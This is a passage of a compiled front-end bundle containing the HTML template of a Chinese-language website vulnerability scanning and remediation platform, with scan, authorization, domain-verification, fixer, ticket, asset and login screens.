(function(){const i=document.createElement("link").relList;if(i&&i.supports&&i.supports("modulepreload"))return;for(const s of document.querySelectorAll('link[rel="modulepreload"]'))r(s);new MutationObserver(s=>{for(const o of s)if(o.type==="childList")for(const a of o.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&r(a)}).observe(document,{childList:!0,subtree:!0});function t(s){const o={};return s.integrity&&(o.integrity=s.integrity),s.referrerPolicy&&(o.referrerPolicy=s.referrerPolicy),s.crossOrigin==="use-credentials"?o.credentials="include":s.crossOrigin==="anonymous"?o.credentials="omit":o.credentials="same-origin",o}function r(s){if(s.ep)return;s.ep=!0;const o=t(s);fetch(s.href,o)}})();const Si=`</head>

<body>

<a href="#page-home" class="skip-link">跳转到主内容</a>



<!-- Skeleton Loading Screen -->

<div id="skeleton-screen" class="skeleton-screen">

  <div class="skeleton-topbar">

    <div class="skeleton-topbar-logo"></div>

    <div class="skeleton-topbar-line"></div>

  </div>

  <div class="skeleton-search"></div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

</div>





<!-- Toast Container -->

<div class="toast-container" id="toast-container"></div>



<!-- AI Advisor Floating Button -->

<button class="ai-fab" id="ai-fab" onclick="toggleAIChat()" aria-label="打开安全顾问" title="安全顾问">

  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px"><path d="M12 2a8 8 0 0 1 8 8v4a8 8 0 0 1-16 0v-4a8 8 0 0 1 8-8z"/><circle cx="9" cy="10" r="1" fill="currentColor"/><circle cx="15" cy="10" r="1" fill="currentColor"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/></svg>

  <span class="ai-fab-badge" id="ai-fab-badge" style="display:none">0</span>

</button>



<!-- AI Advisor Chat Window -->

<div class="ai-chat" id="ai-chat">

  <div class="ai-chat-header">

    <div class="ai-chat-header-info">

      <div class="ai-avatar" style="background:var(--primary);color:#fff;display:flex;align-items:center;justify-content:center;width:28px;height:28px">VS</div>

      <div>

        <div style="font-size:13px;font-weight:600">安全顾问</div>

        <div style="font-size:11px;color:#808080">在线服务中</div>

      </div>

    </div>

    <button class="ai-chat-close" onclick="toggleAIChat()" aria-label="关闭">×</button>

  </div>

  <div class="ai-chat-body" id="ai-chat-body">

    <div id="ai-offline-notice" style="display:none;padding:8px 10px;background:#313335;border:1px solid #555555;border-radius:2px;font-size:12px;color:var(--text-secondary);text-align:center;margin-bottom:8px">

      当前使用本地规则引擎；配置 LLM API Key 后回答更精准。

    </div>

    <div class="ai-msg bot">

      安全顾问随时在线，可以帮你解读漏洞、生成修复建议、梳理扫描证据，并提示哪些结果待复测。<br><br>

      快捷问题

    </div>

  </div>

  <div class="ai-quick" id="ai-quick">

    <button onclick="askAIQuick('HSTS 是什么？')">HSTS 是什么</button>

    <button onclick="askAIQuick('怎么修 CSP？')">修复 CSP</button>

    <button onclick="askAIQuick('敏感文件怎么防？')">敏感文件</button>

    <button onclick="askAIQuick('SQL 注入怎么防？')">SQL 注入</button>

    <button onclick="askAIQuick('XSS 是什么？')">XSS 漏洞</button>

  </div>

  <div class="ai-chat-input">

    <input type="text" id="ai-input" placeholder="输入安全问题..." maxlength="200" onkeydown="if(event.key==='Enter')sendAIMessage()" />

    <button onclick="sendAIMessage()" aria-label="发送">发送</button>

  </div>

</div>



<div class="page active" id="page-home" role="main">

  <!-- Workbench Header -->

  <div class="workbench-header">

    <div style="display:flex;justify-content:space-between;gap:16px;align-items:flex-start;flex-wrap:wrap">

      <div style="min-width:280px;flex:1">

        <h1 class="workbench-title">漏洞扫描与交付平台</h1>

        <span class="workbench-subtitle">输入网址后自动完成扫描、证据收集、修复建议、复扫验证和审计留痕，面向上线前自查、客户交付和持续安全运营，支持演示、内测和小范围交付</span>

      </div>

      <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">

        <button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px 16px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:700">开始扫描</button>

        <button onclick="navigateTo('result')" style="background:rgba(75,110,175,0.12);color:var(--primary);border:1px solid rgba(75,110,175,0.35);padding:10px 16px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:700">查看报告</button>

        <button onclick="navigateTo('audit')" style="background:rgba(115,201,144,0.12);color:#73c990;border:1px solid rgba(115,201,144,0.35);padding:10px 16px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:700">审计闭环</button>

        <button onclick="navigateTo('profile')" style="background:transparent;color:var(--text-secondary);border:1px solid var(--border);padding:10px 16px;border-radius:2px;cursor:pointer;font-size:13px">账号设置</button>

      </div>

    </div>

  </div>



  <div id="home-onboarding-banner" class="card fade-in-up" style="display:none;margin-top:14px;padding:14px;border:1px solid rgba(75,110,175,0.35);background:linear-gradient(135deg, rgba(75,110,175,0.12), rgba(115,201,144,0.08))">

    <div style="display:flex;justify-content:space-between;gap:16px;align-items:flex-start;flex-wrap:wrap">

      <div style="min-width:240px;flex:1">

        <div style="font-size:13px;font-weight:700;color:var(--text-primary);margin-bottom:6px">3 步开始你的第一次扫描</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">① 输入网址并确认授权 → ② 查看风险、证据与修复建议 → ③ 创建工单、复测并导出报告。

        受控访问可先体验白名单站点，正式账号可保存记录、发工单、看审计信息和复测，适合内测、演示和交付前验收。</div>

      </div>

      <div style="display:flex;gap:8px;flex-wrap:wrap">

        <button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">开始扫描</button>

        <button onclick="navigateTo('profile')" style="background:rgba(75,110,175,0.12);color:var(--primary);border:1px solid rgba(75,110,175,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">账号设置</button>

        <button onclick="navigateTo('audit')" style="background:rgba(115,201,144,0.12);color:#73c990;border:1px solid rgba(115,201,144,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">上线审计</button>

        <button onclick="dismissHomeOnboarding()" style="background:transparent;color:var(--text-secondary);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px">不再提示</button>

      </div>

    </div>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-top:14px">

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">适合谁</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">安全团队、研发、运维、甲方安全负责人</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">产出什么</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">可直接给老板、研发和客户看的结果报告</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">闭环能力</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">扫描、证据、修复、验证、工单、复测一条线打通</div>

      </div>

    </div>

  </div>



  <!-- 核心数据总览 -->

  <div class="card fade-in-up dashboard-stats" style="margin-top:14px;padding:12px;background:#3c3f41;border:1px solid #555555">

    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;text-align:center">

      <div class="stat-cell">

        <div class="stat-value" style="color:#73c990" id="home-stat-scan-count">-</div>

        <div class="stat-label">总扫描次数</div>

        <div class="stat-sub">真实运行记录</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#4b6eaf" id="home-stat-high-risk">-</div>

        <div class="stat-label">高风险发现</div>

        <div class="stat-sub">需要优先处理</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#f0a732" id="home-stat-fixed-count">-</div>

        <div class="stat-label">已修复项</div>

        <div class="stat-sub">复测确认关闭</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#c75450" id="home-stat-score">-</div>

        <div class="stat-label">最近评分</div>

        <div class="stat-sub">最近一次扫描</div>

      </div>

    </div>

  </div>



  <!-- 11-S: 技术亮点（最醒目的位置） -->

  <div class="card fade-in-up" style="margin-top:18px;background:#3c3f41;border:1px solid #555555;border-radius:2px;overflow:hidden">

    <!-- 顶部标题栏 -->

    <div style="padding:12px 12px 10px;background:#313335;border-bottom:1px solid #555555">

      <div style="display:flex;align-items:center;gap:10px">

        <div style="flex:1">

          <div style="font-size:13px;font-weight:600;color:#bbbbbb">安全闭环：扫描 → 风险定位 → 修复配置生成 → 复测对比 → 报告导出</div>

          <div style="font-size:11px;color:#808080;margin-top:2px">多平台修复配置生成 · 交叉验证降低误报 · 导出专业报告</div>

        </div>

        <span style="font-size:10px;background:#4b6eaf;color:#fff;padding:2px 8px;border-radius:2px;font-weight:600">11-S 核心能力</span>

      </div>

    </div>

    <!-- 三大技术亮点 -->

    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#555555;margin:0">

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">置信度分级</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">高/中/低三级标注<br>辅助优先级排序</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">反馈闭环</div>

          <div style="font-size:11px;color:#808080;line-height:1.5">用户反馈结果<br>持续优化检测模型</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">安全闭环</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">扫描 → 风险定位 → 修复配置 → 复测 → 报告</div>

      </div>

    </div>

    <!-- 本地扫描入口（登录后显示） -->

  </div>



  <!-- 风险趋势图 -->

  <div class="card fade-in-up" style="margin-top:18px">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">

      <strong style="font-size:14px;color:var(--text-primary)">风险趋势</strong>

      <div style="display:flex;gap:6px">

        <button onclick="loadTrendChart(7)" class="trend-range" data-days="7" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">7天</button>

        <button onclick="loadTrendChart(30)" class="trend-range" data-days="30" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">30天</button>

      </div>

    </div>

    <div id="trend-chart" style="min-height:120px;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:12px">扫描几个目标后，即可查看分数变化趋势。</div>

  </div>





  <section class="scan-section card fade-in-up" style="animation-delay:0.1s">

    <h2 class="card-title">安全扫描</h2>

    <p class="card-desc">输入目标网站地址并确认授权后开始扫描，结果会进入报告和审计闭环。</p>



    <!-- 仪表盘概览（已登录时显示） -->

    <div id="dashboard-overview" style="display:none;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px">

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#4b6eaf" id="stat-total">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">总扫描次数</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#c75450" id="stat-high">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">高风险</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#73c990" id="stat-fixed">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">已修复</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#f0a732" id="stat-score">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">最近评分</div></div>

    </div>



    <!-- 11-S: 安全趋势面板 -->

    <div id="trend-panel" style="display:none;margin-bottom:20px">

      <div class="card" style="padding:16px">

        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

          <div style="display:flex;align-items:center;gap:8px">

            <h3 style="margin:0;font-size:15px;font-weight:700">安全评分趋势</h3>

          </div>

          <div id="trend-summary" style="display:flex;gap:12px;flex-wrap:wrap"></div>

        </div>

        <div id="trend-chart-container" style="position:relative;width:100%;height:200px;background:#313335;border:1px solid #555555;border-radius:2px;overflow:hidden">

          <canvas id="trend-canvas" style="width:100%;height:100%"></canvas>

          <div id="trend-empty" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:13px">暂无扫描数据，完成首次扫描后即可查看趋势</div>

        </div>

        <div id="trend-legend" style="display:flex;gap:12px;margin-top:10px;flex-wrap:wrap"></div>

      </div>

    </div>



    <!-- Step 1: Input URL -->

    <div id="verify-step-1" class="verify-step">

      <div class="verify-step-header">

        <span class="verify-num">1</span>

        <span>输入目标网址</span>

      </div>

      <div class="scan-input-wrap">

        <input id="scan-url" type="url" placeholder="例如：https://example.com" aria-label="目标网址" oninput="updateScanStartState()" />

      </div>

      <div id="scan-login-tip" style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 14px;margin-bottom:10px;text-align:center;display:none">

        <div style="font-size:12px;color:var(--text-secondary);margin-bottom:6px">登录后即可开始扫描，结果会自动进入报告、工单和审计记录</div>

        <button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 18px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">立即登录 / 注册</button>

      </div>

      <div id="scan-credits-hint" style="display:none;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.25);border-radius:2px;padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text-secondary);line-height:1.6">

        <strong style="color:var(--primary)">额度提示</strong><br/>

        当前额度：<span id="scan-credits-value">--</span> · 标准扫描消耗 1 · 深度扫描消耗 3

      </div>

      <label class="scan-checkbox" style="margin-bottom:12px">

        <input id="auth-check-step1" type="checkbox" onchange="updateScanStartState()" />

        <span>我已确认拥有该域名或已获得授权扫描</span>

      </label>

      <button class="scan-btn" id="scan-btn-step1" onclick="startScanDirect()" disabled>开始扫描并生成报告</button>

      <div style="text-align:center;margin-top:10px">

        <button onclick="goVerifyStep2()" style="background:none;border:none;color:var(--primary);font-size:13px;padding:8px;cursor:pointer">域名归属验证（推荐）</button>

        <div style="font-size:12px;color:var(--text-secondary);margin-top:4px">快速演示仅适用于自有目标或授权场景，正式交付建议完成归属验证</div>

      </div>

      <div style="text-align:center;margin-top:8px">

        <button onclick="showBatchScanModal()" style="background:none;border:1px dashed var(--border);color:var(--text-secondary);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;width:100%">批量扫描（一次最多 5 个 URL，适合交付前巡检）</button>

      </div>

    </div>



    <!-- Step 2: Generate Verification Token -->

    <div id="verify-step-2" class="verify-step" style="display:none">

      <div class="verify-step-header">

        <span class="verify-num">2</span>

        <span>域名归属验证</span>

      </div>

      <p class="verify-desc">请选择一种验证方式，在目标网站添加以下验证信息：</p>

      <div class="token-box">

        <label>验证 Token</label>

        <code id="verify-token">vuln-sentinel-xxxx</code>

        <button class="token-copy-btn" onclick="copyToken()" aria-label="复制验证令牌">复制</button>

      </div>

      <div class="verify-methods">

        <div class="verify-method" onclick="selectVerifyMethod(this, 'dns')">

          <strong>DNS TXT 验证</strong>

          <p>添加 TXT 记录：<code id="dns-record">_vuln-sentinel.example.com TXT "vuln-sentinel-xxxx"</code></p>

        </div>

        <div class="verify-method" onclick="selectVerifyMethod(this, 'file')">

          <strong>网站文件验证</strong>

          <p>在网站根目录创建文件：<code>vuln-sentinel-verification.txt</code>，内容为 Token</p>

        </div>

      </div>

      <div class="verify-method-selected" id="verify-method-info">

        <p>选择一种验证方式</p>

      </div>

      <button class="scan-btn" onclick="confirmVerification()" id="verify-confirm-btn" disabled>已添加验证信息，确认验证</button>

      <button onclick="skipVerification()" id="verify-skip-btn" style="background:none;border:none;color:var(--primary);font-size:13px;padding:10px;margin-top:6px;cursor:pointer;width:100%;text-align:center">快速测试（跳过 DNS/文件验证）</button>

    </div>



    <!-- Step 3: Ready to Scan -->

    <div id="verify-step-3" class="verify-step" style="display:none">

      <div class="verify-step-header done">

        <span class="verify-num done">OK</span>

        <span>准备开始扫描</span>

      </div>

      <div class="verify-passed">

        <p>已确认目标网址，勾选授权声明后开始扫描。</p>

        <div class="scan-input-wrap">

          <input id="scan-url-confirmed" type="url" readonly aria-label="已确认的目标网址" />

        </div>

        <label class="scan-checkbox">

          <input id="auth-check" type="checkbox" onchange="updateScanStartState()" />

          <span>我已确认拥有该域名或已获得授权扫描</span>

        </label>

        <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap">

          <span style="font-size:13px;color:var(--text-secondary)">扫描深度：</span>

          <div id="scan-depth-group" style="display:inline-flex;border:1px solid var(--border);border-radius:2px;overflow:hidden">

            <label class="scan-depth-opt" data-value="quick" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="quick" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 快速

            </label>

            <label class="scan-depth-opt active" data-value="standard" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--primary);color:#fff;border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="standard" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" checked /> 标准

            </label>

            <label class="scan-depth-opt" data-value="deep" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="deep" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 深度

            </label>

          </div>

          <span id="depth-hint" style="font-size:12px;color:var(--text-secondary);margin-left:4px">约 3-5 秒 · 推荐</span>

        </div>

        <button class="scan-btn" id="scan-btn" onclick="startScan()" disabled>开始扫描并生成报告</button>

      </div>

    </div>

  </section>



  <!-- 公开演示扫描 -->

  <div class="card public-report-card" id="public-report-card" style="margin-top:18px">

    <div class="card-title" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">

      <div>

        <span style="font-size:13px">公开演示扫描</span>

        <span style="font-size:12px;color:var(--text-secondary);margin-left:8px">无需登录，即时检测公开站点</span>

      </div>

      <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">

        <select id="public-report-host" onchange="loadPublicDemo()" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:5px 10px;border-radius:2px;font-size:12px;cursor:pointer">

          <option value="https://example.com">example.com</option>

          <option value="https://www.iana.org">iana.org</option>

          <option value="https://httpbin.org">httpbin.org</option>

          <option value="https://testphp.vulnweb.com">testphp.vulnweb.com（公开演示）</option>

        </select>

        <button onclick="loadPublicDemo()" id="public-report-refresh" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:5px 12px;border-radius:2px;font-size:12px;cursor:pointer;font-weight:500">刷新报告</button>

      </div>

    </div>

    <div id="public-report-content">

      <div style="padding:16px;text-align:center;color:var(--text-secondary);background:var(--bg);border-radius:2px;margin-top:12px;border:1px dashed var(--border)">

        <div style="font-size:12px;margin-bottom:8px;color:var(--text)">选择公开演示站点，立即查看扫描结果</div>

        <div style="margin-top:10px"><button onclick="loadPublicDemo()" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">查看公开演示结果</button></div>

      </div>

    </div>

  </div>

</div>



<div class="page" id="page-result">

  <div class="workbench-header">

    <h1 class="workbench-title">扫描结果 / Scan Result</h1>

    <span class="workbench-subtitle">查看漏洞发现、响应头与修复建议</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>

  <div id="result-content"></div>

</div>



<div class="page" id="page-fixer">

  <div class="workbench-header">

    <h1 class="workbench-title">修复器 / Fixer</h1>

    <span class="workbench-subtitle">检查配置文件并生成安全加固补丁</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">输入配置</div>

    <p class="card-desc" style="margin-bottom:12px">粘贴 Nginx/Apache 配置文件，检测安全问题并生成修复补丁。</p>

    <textarea id="fixer-input" class="fixer-textarea" placeholder="粘贴 Nginx 配置文件...&#10;&#10;例如：&#10;server {&#10;    listen 80;&#10;    server_name example.com;&#10;    ...&#10;}"></textarea>

    <div class="fixer-btns">

      <button class="fixer-btn primary" id="fixer-analyze-btn" onclick="analyzeFixer()">检查配置</button>

      <button class="fixer-btn secondary" onclick="loadSampleConfig()">载入参考配置</button>

      <button class="fixer-btn secondary" onclick="clearFixer()">清空</button>

    </div>

  </div>



  <div class="card" id="fixer-scan-prompt">

    <div class="card-title">使用上次扫描结果</div>

    <p style="font-size:13px;color:var(--text-secondary);line-height:1.8">

      1. 在<strong>扫描</strong>页面完成网站安全扫描<br>

      2. 扫描结果页点击<strong>"生成修复配置"</strong><br>

      3. 此处自动生成 Nginx / Python / Node.js / Apache 修复代码

    </p>

    <div class="fixer-btns" style="margin-top:12px">

      <button class="fixer-btn primary" id="goto-fixer-btn" onclick="goToFixerWithScanResult()" aria-label="生成修复配置">使用上次扫描结果生成</button>

    </div>

  </div>



  <div id="fixer-lang-tabs" style="display:none;margin:16px 0">

    <div style="display:flex;gap:6px;flex-wrap:wrap">

      <button class="fixer-btn primary lang-tab active" data-lang="nginx" onclick="switchFixLang('nginx')">Nginx</button>

      <button class="fixer-btn secondary lang-tab" data-lang="python" onclick="switchFixLang('python')">Python</button>

      <button class="fixer-btn secondary lang-tab" data-lang="nodejs" onclick="switchFixLang('nodejs')">Node.js</button>

      <button class="fixer-btn secondary lang-tab" data-lang="apache" onclick="switchFixLang('apache')">Apache</button>

    </div>

  </div>



  <div id="fixer-result"></div>

</div>



<!-- 进化页面 11-S -->

<div class="page" id="page-evolution">

  <div class="workbench-header">

    <h1 class="workbench-title">进化中心 / Evolution</h1>

    <span class="workbench-subtitle">历史学习与持续监控</span>

  </div>

  <div id="evolution-content" style="min-height:400px"></div>

</div>



<!-- 资产管理页面 -->

<div class="page" id="page-assets">

  <div class="workbench-header">

    <h1 class="workbench-title">资产管理 / Assets</h1>

    <span class="workbench-subtitle">管理网站域名资产与扫描状态</span>

  </div>



  <!-- 添加资产表单 -->

  <div class="card" style="margin-bottom:16px">

    <div class="card-title">添加资产</div>

    <div class="settings-row-static" style="padding:14px 0 0 0;border-bottom:none;flex-wrap:wrap">

      <div style="flex:1;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">域名</label>

        <input type="text" id="asset-domain" placeholder="example.com" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:1;min-width:160px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">负责人</label>

        <input type="text" id="asset-owner" placeholder="负责人姓名" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:2;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">描述</label>

        <input type="text" id="asset-description" placeholder="资产描述（可选）" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <button class="fixer-btn primary" data-action="add-asset" style="height:32px;padding:0 16px">添加</button>

    </div>

    <div id="asset-form-error" style="color:var(--danger);font-size:12px;margin-top:8px;display:none"></div>

  </div>



  <!-- 资产列表 -->

  <div class="card" id="asset-list-container">

    <div class="card-title">资产列表</div>

    <div id="asset-list" style="margin-top:10px"></div>

    <div id="asset-empty" class="ticket-empty" style="display:none">

      <div class="ticket-empty-icon"></div>

      <p>暂无资产</p>

      <p class="ticket-empty-hint">添加域名资产后可跟踪扫描状态</p>

    </div>

  </div>

</div>



<!-- 修复工单页面 -->

<div class="page" id="page-tickets">

  <div class="workbench-header">

    <h1 class="workbench-title">修复工单 / Tickets</h1>

    <span class="workbench-subtitle">跟踪和管理扫描发现的安全问题</span>

  </div>



  <!-- 状态标签页 -->

  <div class="ticket-tabs">

    <button class="ticket-tab active" data-action="switch-ticket-tab" data-status="pending">待修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="in_progress">修复中</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="fixed">已修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="ignored">已忽略</button>

  </div>



  <!-- 批量操作 -->

  <div class="ticket-batch" id="ticket-batch-bar" style="display:none">

    <label class="ticket-batch-label"><input type="checkbox" id="ticket-select-all" data-action="toggle-select-all"> 全选</label>

    <span id="ticket-selected-count" class="ticket-selected-count">已选 0 项</span>

    <div class="ticket-batch-actions">

      <button class="ticket-batch-btn" data-action="batch-update" data-status="in_progress">标记修复中</button>

      <button class="ticket-batch-btn" data-action="batch-update" data-status="fixed">标记已修复</button>

      <button class="ticket-batch-btn secondary" data-action="batch-update" data-status="ignored">标记已忽略</button>

      <button class="ticket-batch-btn danger" data-action="batch-delete">删除</button>

    </div>

  </div>



  <!-- 工单工作台：左侧列表 / 右侧详情 -->

  <div class="ticket-workbench" id="ticket-workbench" style="display:none">

    <div class="ticket-list-panel">

      <div class="ticket-list-header">工单列表</div>

      <div class="ticket-table-wrap">

        <table class="ticket-table" id="ticket-table">

          <thead><tr><th style="width:30px"><input type="checkbox" id="ticket-select-all-table" data-action="toggle-select-all"></th><th>发现项</th><th>等级</th><th>状态</th><th>创建时间</th></tr></thead>

          <tbody id="ticket-list"></tbody>

        </table>

      </div>

    </div>

    <div class="ticket-detail-panel" id="ticket-detail-panel">

      <div class="ticket-detail-empty">选择左侧工单查看详情</div>

    </div>

  </div>



  <!-- 空状态 -->

  <div id="ticket-empty" class="ticket-empty" style="display:none">

    <div class="ticket-empty-icon"></div>

    <p>该状态下暂无工单</p>

    <p class="ticket-empty-hint">完成扫描后，高危/严重问题会自动创建工单，也可以从结果页手动转工单。</p>

    <div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:12px">

      <button class="fixer-btn primary" onclick="navigateTo('home')">去看报告</button>

      <button class="fixer-btn secondary" onclick="navigateTo('scan')">开始扫描</button>

    </div>

  </div>

</div>



<div class="page" id="page-profile">

  <div class="workbench-header">

    <h1 class="workbench-title">设置 / Settings</h1>

    <span class="workbench-subtitle">账号、主题与系统配置</span>

  </div>



  <!-- 登录/注册区域 -->

  <div id="auth-section">

    <!-- 未登录：显示登录/注册表单 -->

    <div id="auth-guest" style="display:none">

      <div class="card auth-form">

        <h3>账号登录</h3>

        <div class="auth-form-error" id="login-error"></div><div id="auth-status-message" class="auth-form-hint" style="margin-top:8px;color:var(--text-secondary)">可用受控测试账号登录，或直接使用你的账号。</div>

        <div class="auth-form-row">

          <input type="text" id="login-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <label for="login-password" class="sr-only">密码</label><input type="password" id="login-password" aria-label="密码" placeholder="密码" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doLogin()">登 录</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('reset')">找回密码</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('reset')">找回密码</a> · <a onclick="toggleAuthForm('register')">立即注册</a>

        </div>

      </div>

    </div>



    <!-- 重置密码表单 -->

    <div id="auth-reset" style="display:none">

      <div class="card auth-form">

        <h3>修改密码</h3>

        <div class="auth-form-error" id="reset-error"></div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password" placeholder="新密码（至少6位）" aria-label="新密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password2" placeholder="确认新密码" aria-label="确认新密码" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reset-token-input" placeholder="重置 token" aria-label="重置 token" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doPasswordResetConfirm()">确认重置</button>

